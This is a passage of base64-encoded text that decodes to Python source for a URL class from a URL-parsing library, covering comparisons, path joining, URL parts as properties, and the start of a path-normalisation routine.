lX18oc2VsZiwgb3RoZXIpOlxyXG4gICAgICAgIGlmIG5vdCB0eXBlKG90aGVyKSBpcyBVUkw6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWwgPD0gb3RoZXIuX3ZhbFxyXG5cclxuICAgIGRlZiBfX2x0X18oc2VsZiwgb3RoZXIpOlxyXG4gICAgICAgIGlmIG5vdCB0eXBlKG90aGVyKSBpcyBVUkw6XHJcbiAgICAgICAgICAgIHJldHVybiBOb3RJbXBsZW1lbnRlZFxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWwgPCBvdGhlci5fdmFsXHJcblxyXG4gICAgZGVmIF9fZ2VfXyhzZWxmLCBvdGhlcik6XHJcbiAgICAgICAgaWYgbm90IHR5cGUob3RoZXIpIGlzIFVSTDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbCA+PSBvdGhlci5fdmFsXHJcblxyXG4gICAgZGVmIF9fZ3RfXyhzZWxmLCBvdGhlcik6XHJcbiAgICAgICAgaWYgbm90IHR5cGUob3RoZXIpIGlzIFVSTDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbCA+IG90aGVyLl92YWxcclxuXHJcbiAgICBkZWYgX190cnVlZGl2X18oc2VsZiwgbmFtZSk6XHJcbiAgICAgICAgbmFtZSA9IHNlbGYuX1BBVEhfUVVPVEVSKG5hbWUpXHJcbiAgICAgICAgaWYgbmFtZS5zdGFydHN3aXRoKCIvIik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiQXBwZW5kaW5nIHBhdGggeyFyfSBzdGFydGluZyBmcm9tIHNsYXNoIGlzIGZvcmJpZGRlbiIuZm9ybWF0KG5hbWUpXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBwYXRoID0gc2VsZi5fdmFsLnBhdGhcclxuICAgICAgICBpZiBwYXRoID09ICIvIjpcclxuICAgICAgICAgICAgbmV3X3BhdGggPSAiLyIgKyBuYW1lXHJcbiAgICAgICAgZWxpZiBub3QgcGF0aCBhbmQgbm90IHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgbmV3X3BhdGggPSBuYW1lXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcGFydHMgPSBwYXRoLnJzdHJpcCgiLyIpLnNwbGl0KCIvIilcclxuICAgICAgICAgICAgcGFydHMuYXBwZW5kKG5hbWUpXHJcbiAgICAgICAgICAgIG5ld19wYXRoID0gIi8iLmpvaW4ocGFydHMpXHJcbiAgICAgICAgaWYgc2VsZi5pc19hYnNvbHV0ZSgpOlxyXG4gICAgICAgICAgICBuZXdfcGF0aCA9IHNlbGYuX25vcm1hbGl6ZV9wYXRoKG5ld19wYXRoKVxyXG4gICAgICAgIHJldHVybiBVUkwoXHJcbiAgICAgICAgICAgIHNlbGYuX3ZhbC5fcmVwbGFjZShwYXRoPW5ld19wYXRoLCBxdWVyeT0iIiwgZnJhZ21lbnQ9IiIpLCBlbmNvZGVkPVRydWVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fbW9kX18oc2VsZiwgcXVlcnkpOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnVwZGF0ZV9xdWVyeShxdWVyeSlcclxuXHJcbiAgICBkZWYgX19ib29sX18oc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gYm9vbChcclxuICAgICAgICAgICAgc2VsZi5fdmFsLm5ldGxvYyBvciBzZWxmLl92YWwucGF0aCBvciBzZWxmLl92YWwucXVlcnkgb3Igc2VsZi5fdmFsLmZyYWdtZW50XHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfX2dldHN0YXRlX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIChzZWxmLl92YWwsKVxyXG5cclxuICAgIGRlZiBfX3NldHN0YXRlX18oc2VsZiwgc3RhdGUpOlxyXG4gICAgICAgIGlmIHN0YXRlWzBdIGlzIE5vbmUgYW5kIGlzaW5zdGFuY2Uoc3RhdGVbMV0sIGRpY3QpOlxyXG4gICAgICAgICAgICAjIGRlZmF1bHQgc3R5bGUgcGlja2xlXHJcbiAgICAgICAgICAgIHNlbGYuX3ZhbCA9IHN0YXRlWzFdWyJfdmFsIl1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl92YWwsICp1bnVzZWQgPSBzdGF0ZVxyXG4gICAgICAgIHNlbGYuX2NhY2hlID0ge31cclxuXHJcbiAgICBkZWYgaXNfYWJzb2x1dGUoc2VsZik6XHJcbiAgICAgICAgIiIiQSBjaGVjayBmb3IgYWJzb2x1dGUgVVJMcy5cclxuXHJcbiAgICAgICAgUmV0dXJuIFRydWUgZm9yIGFic29sdXRlIG9uZXMgKGhhdmluZyBzY2hlbWUgb3Igc3RhcnRpbmdcclxuICAgICAgICB3aXRoIC8vKSwgRmFsc2Ugb3RoZXJ3aXNlLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5yYXdfaG9zdCBpcyBub3QgTm9uZVxyXG5cclxuICAgIGRlZiBpc19kZWZhdWx0X3BvcnQoc2VsZik6XHJcbiAgICAgICAgIiIiQSBjaGVjayBmb3IgZGVmYXVsdCBwb3J0LlxyXG5cclxuICAgICAgICBSZXR1cm4gVHJ1ZSBpZiBwb3J0IGlzIGRlZmF1bHQgZm9yIHNwZWNpZmllZCBzY2hlbWUsXHJcbiAgICAgICAgZS5nLiBcJ2h0dHA6Ly9weXRob24ub3JnXCcgb3IgXCdodHRwOi8vcHl0aG9uLm9yZzo4MFwnLCBGYWxzZVxyXG4gICAgICAgIG90aGVyd2lzZS5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgc2VsZi5wb3J0IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgIGRlZmF1bHQgPSBERUZBVUxUX1BPUlRTLmdldChzZWxmLnNjaGVtZSlcclxuICAgICAgICBpZiBkZWZhdWx0IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG4gICAgICAgIHJldHVybiBzZWxmLnBvcnQgPT0gZGVmYXVsdFxyXG5cclxuICAgIGRlZiBvcmlnaW4oc2VsZik6XHJcbiAgICAgICAgIiIiUmV0dXJuIGFuIFVSTCB3aXRoIHNjaGVtZSwgaG9zdCBhbmQgcG9ydCBwYXJ0cyBvbmx5LlxyXG5cclxuICAgICAgICB1c2VyLCBwYXNzd29yZCwgcGF0aCwgcXVlcnkgYW5kIGZyYWdtZW50IGFyZSByZW1vdmVkLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICAjIFRPRE86IGFkZCBhIGtleXdvcmQtb25seSBvcHRpb24gZm9yIGtlZXBpbmcgdXNlci9wYXNzIG1heWJlP1xyXG4gICAgICAgIGlmIG5vdCBzZWxmLmlzX2Fic29sdXRlKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVSTCBzaG91bGQgYmUgYWJzb2x1dGUiKVxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl92YWwuc2NoZW1lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVUkwgc2hvdWxkIGhhdmUgc2NoZW1lIilcclxuICAgICAgICB2ID0gc2VsZi5fdmFsXHJcbiAgICAgICAgbmV0bG9jID0gc2VsZi5fbWFrZV9uZXRsb2MoTm9uZSwgTm9uZSwgdi5ob3N0bmFtZSwgdi5wb3J0KVxyXG4gICAgICAgIHZhbCA9IHYuX3JlcGxhY2UobmV0bG9jPW5ldGxvYywgcGF0aD0iIiwgcXVlcnk9IiIsIGZyYWdtZW50PSIiKVxyXG4gICAgICAgIHJldHVybiBVUkwodmFsLCBlbmNvZGVkPVRydWUpXHJcblxyXG4gICAgZGVmIHJlbGF0aXZlKHNlbGYpOlxyXG4gICAgICAgICIiIlJldHVybiBhIHJlbGF0aXZlIHBhcnQgb2YgdGhlIFVSTC5cclxuXHJcbiAgICAgICAgc2NoZW1lLCB1c2VyLCBwYXNzd29yZCwgaG9zdCBhbmQgcG9ydCBhcmUgcmVtb3ZlZC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbm90IHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVVJMIHNob3VsZCBiZSBhYnNvbHV0ZSIpXHJcbiAgICAgICAgdmFsID0gc2VsZi5fdmFsLl9yZXBsYWNlKHNjaGVtZT0iIiwgbmV0bG9jPSIiKVxyXG4gICAgICAgIHJldHVybiBVUkwodmFsLCBlbmNvZGVkPVRydWUpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc2NoZW1lKHNlbGYpOlxyXG4gICAgICAgICIiIlNjaGVtZSBmb3IgYWJzb2x1dGUgVVJMcy5cclxuXHJcbiAgICAgICAgRW1wdHkgc3RyaW5nIGZvciByZWxhdGl2ZSBVUkxzIG9yIFVSTHMgc3RhcnRpbmcgd2l0aCAvL1xyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fdmFsLnNjaGVtZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJhd19hdXRob3JpdHkoc2VsZik6XHJcbiAgICAgICAgIiIiRW5jb2RlZCBhdXRob3JpdHkgcGFydCBvZiBVUkwuXHJcblxyXG4gICAgICAgIEVtcHR5IHN0cmluZyBmb3IgcmVsYXRpdmUgVVJMcy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5uZXRsb2NcclxuXHJcbiAgICBAY2FjaGVkX3Byb3BlcnR5XHJcbiAgICBkZWYgYXV0aG9yaXR5KHNlbGYpOlxyXG4gICAgICAgICIiIkRlY29kZWQgYXV0aG9yaXR5IHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBFbXB0eSBzdHJpbmcgZm9yIHJlbGF0aXZlIFVSTHMuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9tYWtlX25ldGxvYyhcclxuICAgICAgICAgICAgc2VsZi51c2VyLCBzZWxmLnBhc3N3b3JkLCBzZWxmLmhvc3QsIHNlbGYucG9ydCwgZW5jb2RlX2hvc3Q9RmFsc2VcclxuICAgICAgICApXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmF3X3VzZXIoc2VsZik6XHJcbiAgICAgICAgIiIiRW5jb2RlZCB1c2VyIHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBOb25lIGlmIHVzZXIgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBub3QgLnVzZXJuYW1lXHJcbiAgICAgICAgcmV0ID0gc2VsZi5fdmFsLnVzZXJuYW1lXHJcbiAgICAgICAgaWYgbm90IHJldDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuICAgICAgICByZXR1cm4gcmV0XHJcblxyXG4gICAgQGNhY2hlZF9wcm9wZXJ0eVxyXG4gICAgZGVmIHVzZXIoc2VsZik6XHJcbiAgICAgICAgIiIiRGVjb2RlZCB1c2VyIHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBOb25lIGlmIHVzZXIgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX1VOUVVPVEVSKHNlbGYucmF3X3VzZXIpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmF3X3Bhc3N3b3JkKHNlbGYpOlxyXG4gICAgICAgICIiIkVuY29kZWQgcGFzc3dvcmQgcGFydCBvZiBVUkwuXHJcblxyXG4gICAgICAgIE5vbmUgaWYgcGFzc3dvcmQgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5wYXNzd29yZFxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiBwYXNzd29yZChzZWxmKTpcclxuICAgICAgICAiIiJEZWNvZGVkIHBhc3N3b3JkIHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBOb25lIGlmIHBhc3N3b3JkIGlzIG1pc3NpbmcuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9VTlFVT1RFUihzZWxmLnJhd19wYXNzd29yZClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByYXdfaG9zdChzZWxmKTpcclxuICAgICAgICAiIiJFbmNvZGVkIGhvc3QgcGFydCBvZiBVUkwuXHJcblxyXG4gICAgICAgIE5vbmUgZm9yIHJlbGF0aXZlIFVSTHMuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgICMgVXNlIGhvc3QgaW5zdGVhZCBvZiBob3N0bmFtZSBmb3Igc2FrZSBvZiBzaG9ydG5lc3NcclxuICAgICAgICAjIE1heSBhZGQgLmhvc3RuYW1lIHByb3AgbGF0ZXJcclxuICAgICAgICByZXR1cm4gc2VsZi5fdmFsLmhvc3RuYW1lXHJcblxyXG4gICAgQGNhY2hlZF9wcm9wZXJ0eVxyXG4gICAgZGVmIGhvc3Qoc2VsZik6XHJcbiAgICAgICAgIiIiRGVjb2RlZCBob3N0IHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBOb25lIGZvciByZWxhdGl2ZSBVUkxzLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICByYXcgPSBzZWxmLnJhd19ob3N0XHJcbiAgICAgICAgaWYgcmF3IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgaWYgIiUiIGluIHJhdzpcclxuICAgICAgICAgICAgIyBIYWNrIGZvciBzY29wZWQgSVB2NiBhZGRyZXNzZXMgbGlrZVxyXG4gICAgICAgICAgICAjIGZlODA6OjIlXHhkMFx4OWZceGQxXHg4MFx4ZDBceGJlXHhkMFx4YjJceGQwXHhiNVx4ZDFceDgwXHhkMFx4YmFceGQwXHhiMFxyXG4gICAgICAgICAgICAjIHByZXNlbmNlIG9mIFwnJVwnIHNpZ24gbWVhbnMgb25seSBJUHY2IGFkZHJlc3MsIHNvIGlkbmEgaXMgdXNlbGVzcy5cclxuICAgICAgICAgICAgcmV0dXJuIHJhd1xyXG4gICAgICAgIHJldHVybiBfaWRuYV9kZWNvZGUocmF3KVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHBvcnQoc2VsZik6XHJcbiAgICAgICAgIiIiUG9ydCBwYXJ0IG9mIFVSTCwgd2l0aCBzY2hlbWUtYmFzZWQgZmFsbGJhY2suXHJcblxyXG4gICAgICAgIE5vbmUgZm9yIHJlbGF0aXZlIFVSTHMgb3IgVVJMcyB3aXRob3V0IGV4cGxpY2l0IHBvcnQgYW5kXHJcbiAgICAgICAgc2NoZW1lIHdpdGhvdXQgZGVmYXVsdCBwb3J0IHN1YnN0aXR1dGlvbi5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5wb3J0IG9yIERFRkFVTFRfUE9SVFMuZ2V0KHNlbGYuX3ZhbC5zY2hlbWUpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgZXhwbGljaXRfcG9ydChzZWxmKTpcclxuICAgICAgICAiIiJQb3J0IHBhcnQgb2YgVVJMLCB3aXRob3V0IHNjaGVtZS1iYXNlZCBmYWxsYmFjay5cclxuXHJcbiAgICAgICAgTm9uZSBmb3IgcmVsYXRpdmUgVVJMcyBvciBVUkxzIHdpdGhvdXQgZXhwbGljaXQgcG9ydC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5wb3J0XHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmF3X3BhdGgoc2VsZik6XHJcbiAgICAgICAgIiIiRW5jb2RlZCBwYXRoIG9mIFVSTC5cclxuXHJcbiAgICAgICAgLyBmb3IgYWJzb2x1dGUgVVJMcyB3aXRob3V0IHBhdGggcGFydC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0ID0gc2VsZi5fdmFsLnBhdGhcclxuICAgICAgICBpZiBub3QgcmV0IGFuZCBzZWxmLmlzX2Fic29sdXRlKCk6XHJcbiAgICAgICAgICAgIHJldCA9ICIvIlxyXG4gICAgICAgIHJldHVybiByZXRcclxuXHJcbiAgICBAY2FjaGVkX3Byb3BlcnR5XHJcbiAgICBkZWYgcGF0aChzZWxmKTpcclxuICAgICAgICAiIiJEZWNvZGVkIHBhdGggb2YgVVJMLlxyXG5cclxuICAgICAgICAvIGZvciBhYnNvbHV0ZSBVUkxzIHdpdGhvdXQgcGF0aCBwYXJ0LlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fUEFUSF9VTlFVT1RFUihzZWxmLnJhd19wYXRoKVxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiBxdWVyeShzZWxmKTpcclxuICAgICAgICAiIiJBIE11bHRpRGljdFByb3h5IHJlcHJlc2VudGluZyBwYXJzZWQgcXVlcnkgcGFyYW1ldGVycyBpbiBkZWNvZGVkXHJcbiAgICAgICAgcmVwcmVzZW50YXRpb24uXHJcblxyXG4gICAgICAgIEVtcHR5IHZhbHVlIGlmIFVSTCBoYXMgbm8gcXVlcnkgcGFydC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0ID0gTXVsdGlEaWN0KHBhcnNlX3FzbChzZWxmLnJhd19xdWVyeV9zdHJpbmcsIGtlZXBfYmxhbmtfdmFsdWVzPVRydWUpKVxyXG4gICAgICAgIHJldHVybiBNdWx0aURpY3RQcm94eShyZXQpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmF3X3F1ZXJ5X3N0cmluZyhzZWxmKTpcclxuICAgICAgICAiIiJFbmNvZGVkIHF1ZXJ5IHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBFbXB0eSBzdHJpbmcgaWYgcXVlcnkgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5xdWVyeVxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiBxdWVyeV9zdHJpbmcoc2VsZik6XHJcbiAgICAgICAgIiIiRGVjb2RlZCBxdWVyeSBwYXJ0IG9mIFVSTC5cclxuXHJcbiAgICAgICAgRW1wdHkgc3RyaW5nIGlmIHF1ZXJ5IGlzIG1pc3NpbmcuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9RU19VTlFVT1RFUihzZWxmLnJhd19xdWVyeV9zdHJpbmcpXHJcblxyXG4gICAgQGNhY2hlZF9wcm9wZXJ0eVxyXG4gICAgZGVmIHBhdGhfcXMoc2VsZik6XHJcbiAgICAgICAgIiIiRGVjb2RlZCBwYXRoIG9mIFVSTCB3aXRoIHF1ZXJ5LiIiIlxyXG4gICAgICAgIGlmIG5vdCBzZWxmLnF1ZXJ5X3N0cmluZzpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYucGF0aFxyXG4gICAgICAgIHJldHVybiAie30/e30iLmZvcm1hdChzZWxmLnBhdGgsIHNlbGYucXVlcnlfc3RyaW5nKVxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiByYXdfcGF0aF9xcyhzZWxmKTpcclxuICAgICAgICAiIiJFbmNvZGVkIHBhdGggb2YgVVJMIHdpdGggcXVlcnkuIiIiXHJcbiAgICAgICAgaWYgbm90IHNlbGYucmF3X3F1ZXJ5X3N0cmluZzpcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYucmF3X3BhdGhcclxuICAgICAgICByZXR1cm4gInt9P3t9Ii5mb3JtYXQoc2VsZi5yYXdfcGF0aCwgc2VsZi5yYXdfcXVlcnlfc3RyaW5nKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJhd19mcmFnbWVudChzZWxmKTpcclxuICAgICAgICAiIiJFbmNvZGVkIGZyYWdtZW50IHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBFbXB0eSBzdHJpbmcgaWYgZnJhZ21lbnQgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbC5mcmFnbWVudFxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiBmcmFnbWVudChzZWxmKTpcclxuICAgICAgICAiIiJEZWNvZGVkIGZyYWdtZW50IHBhcnQgb2YgVVJMLlxyXG5cclxuICAgICAgICBFbXB0eSBzdHJpbmcgaWYgZnJhZ21lbnQgaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX1VOUVVPVEVSKHNlbGYucmF3X2ZyYWdtZW50KVxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiByYXdfcGFydHMoc2VsZik6XHJcbiAgICAgICAgIiIiQSB0dXBsZSBjb250YWluaW5nIGVuY29kZWQgKnBhdGgqIHBhcnRzLlxyXG5cclxuICAgICAgICAoXCcvXCcsKSBmb3IgYWJzb2x1dGUgVVJMcyBpZiAqcGF0aCogaXMgbWlzc2luZy5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcGF0aCA9IHNlbGYuX3ZhbC5wYXRoXHJcbiAgICAgICAgaWYgc2VsZi5pc19hYnNvbHV0ZSgpOlxyXG4gICAgICAgICAgICBpZiBub3QgcGF0aDpcclxuICAgICAgICAgICAgICAgIHBhcnRzID0gWyIvIl1cclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHBhcnRzID0gWyIvIl0gKyBwYXRoWzE6XS5zcGxpdCgiLyIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgcGF0aC5zdGFydHN3aXRoKCIvIik6XHJcbiAgICAgICAgICAgICAgICBwYXJ0cyA9IFsiLyJdICsgcGF0aFsxOl0uc3BsaXQoIi8iKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcGFydHMgPSBwYXRoLnNwbGl0KCIvIilcclxuICAgICAgICByZXR1cm4gdHVwbGUocGFydHMpXHJcblxyXG4gICAgQGNhY2hlZF9wcm9wZXJ0eVxyXG4gICAgZGVmIHBhcnRzKHNlbGYpOlxyXG4gICAgICAgICIiIkEgdHVwbGUgY29udGFpbmluZyBkZWNvZGVkICpwYXRoKiBwYXJ0cy5cclxuXHJcbiAgICAgICAgKFwnL1wnLCkgZm9yIGFic29sdXRlIFVSTHMgaWYgKnBhdGgqIGlzIG1pc3NpbmcuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiB0dXBsZShzZWxmLl9VTlFVT1RFUihwYXJ0KSBmb3IgcGFydCBpbiBzZWxmLnJhd19wYXJ0cylcclxuXHJcbiAgICBAY2FjaGVkX3Byb3BlcnR5XHJcbiAgICBkZWYgcGFyZW50KHNlbGYpOlxyXG4gICAgICAgICIiIkEgbmV3IFVSTCB3aXRoIGxhc3QgcGFydCBvZiBwYXRoIHJlbW92ZWQgYW5kIGNsZWFuZWQgdXAgcXVlcnkgYW5kXHJcbiAgICAgICAgZnJhZ21lbnQuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHBhdGggPSBzZWxmLnJhd19wYXRoXHJcbiAgICAgICAgaWYgbm90IHBhdGggb3IgcGF0aCA9PSAiLyI6XHJcbiAgICAgICAgICAgIGlmIHNlbGYucmF3X2ZyYWdtZW50IG9yIHNlbGYucmF3X3F1ZXJ5X3N0cmluZzpcclxuICAgICAgICAgICAgICAgIHJldHVybiBVUkwoc2VsZi5fdmFsLl9yZXBsYWNlKHF1ZXJ5PSIiLCBmcmFnbWVudD0iIiksIGVuY29kZWQ9VHJ1ZSlcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGZcclxuICAgICAgICBwYXJ0cyA9IHBhdGguc3BsaXQoIi8iKVxyXG4gICAgICAgIHZhbCA9IHNlbGYuX3ZhbC5fcmVwbGFjZShwYXRoPSIvIi5qb2luKHBhcnRzWzotMV0pLCBxdWVyeT0iIiwgZnJhZ21lbnQ9IiIpXHJcbiAgICAgICAgcmV0dXJuIFVSTCh2YWwsIGVuY29kZWQ9VHJ1ZSlcclxuXHJcbiAgICBAY2FjaGVkX3Byb3BlcnR5XHJcbiAgICBkZWYgcmF3X25hbWUoc2VsZik6XHJcbiAgICAgICAgIiIiVGhlIGxhc3QgcGFydCBvZiByYXdfcGFydHMuIiIiXHJcbiAgICAgICAgcGFydHMgPSBzZWxmLnJhd19wYXJ0c1xyXG4gICAgICAgIGlmIHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgcGFydHMgPSBwYXJ0c1sxOl1cclxuICAgICAgICAgICAgaWYgbm90IHBhcnRzOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuICIiXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gcGFydHNbLTFdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmV0dXJuIHBhcnRzWy0xXVxyXG5cclxuICAgIEBjYWNoZWRfcHJvcGVydHlcclxuICAgIGRlZiBuYW1lKHNlbGYpOlxyXG4gICAgICAgICIiIlRoZSBsYXN0IHBhcnQgb2YgcGFydHMuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX1VOUVVPVEVSKHNlbGYucmF3X25hbWUpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF92YWxpZGF0ZV9hdXRob3JpdHlfdXJpX2Fic19wYXRoKGhvc3QsIHBhdGgpOlxyXG4gICAgICAgICIiIkVuc3VyZSB0aGF0IHBhdGggaW4gVVJMIHdpdGggYXV0aG9yaXR5IHN0YXJ0cyB3aXRoIGEgbGVhZGluZyBzbGFzaC5cclxuXHJcbiAgICAgICAgUmFpc2UgVmFsdWVFcnJvciBpZiBub3QuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbGVuKGhvc3QpID4gMCBhbmQgbGVuKHBhdGgpID4gMCBhbmQgbm90IHBhdGguc3RhcnRzd2l0aCgiLyIpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlBhdGggaW4gYSBVUkwgd2l0aCBhdXRob3JpdHkgc2hvdWxkIHN0YXJ0IHdpdGggYSBzbGFzaCAoXCcvXCcpIGlmIHNldCJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9ub3JtYWxpemVfcGF0aChjbHMsIHBhdGgpOlxyXG4gICAgICAgICMgRHJvcCBcJy5cJyBhbmQgXCcuLlwnIGZyb20gcGF0aFxyXG5cclxuICAgICAgICBzZWdtZW50cyA9IHBhdGguc3BsaXQoIi8iKVxyXG4gICAgICAgIHJlc29sdmVkX3BhdGggPSBbXVxyXG5cclxuICAgICAgICBmb3Igc2VnIGluIHNlZ21lbnRzOlxyXG4gICAgICAgICAgICBpZiBzZWcgPT0gIi4uIjpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICByZXNvbHZlZF9wYXRoLnBvcCgpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgSW5kZXhFcnJvcjpcclxuICAgICAgICAgICAgICAgICAgICAjIGlnbm9yZSBhbnkgLi4gc2VnbWVudHMgdGhhdCB3b3VsZCBvdGhlcndpc2UgY2F1c2UgYW5cclxuICAgICAgICAgICAgICAgICAgICAjIEluZGV4RXJyb3Igd2hlbiBwb3BwZWQgZnJvbSByZXNvbHZlZF9wYXRoIGlmXHJcbiAgICAgICAgICAgICAgICAgICAgIyByZXNvbHZpbmcgZm9yIHJmYzM5ODZcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcbiAgICAgICAgICAgIGVsaWYgc2VnID09ICIuIjpcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlZF9wYXRoLmFwcGVuZChzZWcpXHJcblxyXG4gICAgICAgIGlmIHNlZ21lbnRzWy0xXSBpbiAoIi4iLCAiLi4iKTpcclxuICAgICAgICAgICAgIyBkbyBzb21lIHBvc3QtcHJvY2Vzc2luZyBoZXJlLlxyXG4gICAgICAgICAgICAjIGlmIHRoZSBsYXN0IHNlZ21lbnQgd2FzIGEgcmVsYXRpdmUgZGlyLFxyXG4gICAgICAgICAgICAjIHRoZW4gd2UgbmVlZCB0byBhcHBlbmQgdGhlIHRyYWlsaW5nIFwnL1wnXHJcbiAgICAgICAgICAg